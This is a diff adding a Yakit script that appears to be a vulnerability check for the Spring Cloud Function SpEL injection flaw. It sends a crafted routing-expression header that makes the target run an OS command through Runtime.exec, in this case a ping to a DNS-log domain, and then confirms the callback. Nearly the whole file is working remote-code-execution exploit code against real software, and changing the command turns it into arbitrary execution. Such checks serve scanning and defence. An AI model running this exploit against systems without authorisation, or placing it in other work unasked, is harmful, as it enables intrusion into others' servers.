@@ -1,0 +1,38 @@
+yakit.AutoInitYakit()
+
+# Input your code!
+
+target := cli.String("target")
+port := cli.Int("port")
+
+server,token,err = risk.NewDNSLogDomain()
+println("target: ", target)
+println("port: ", port)
+println("dns_token: ", token)
+
+payload = str.f("ping  %s.dnstunnel.run", token)
+
+rsp, req, err := poc.HTTP(`POST /functionRouter HTTP/1.1 
+Host: {{param(target)}}:{{param(port)}}
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("{{param(payload)}}")
+
+poc test`, poc.params({
+    "target": target,
+    "port": port,
+    "payload": payload,
+}))
+
+die(err)
+
+sleep(1)
+
+dnsdata,err = risk.CheckDNSLogByToken(token)
+die(err)
+
+if len(dnsdata) > 0 {
+    println("Spring Cloud Function SPEL Expression Injection Vulnerability Discovered")
+    yakit.Info("Spring Cloud Function SPEL Expression Injection Vulnerability Discovered")
+}else {
+    println("Spring Cloud Function SPEL Expression Injection Vulnerability  Not Discovered")
+     yakit.Info("Spring Cloud Function SPEL Expression Injection Vulnerability  Not Discovered")
+}
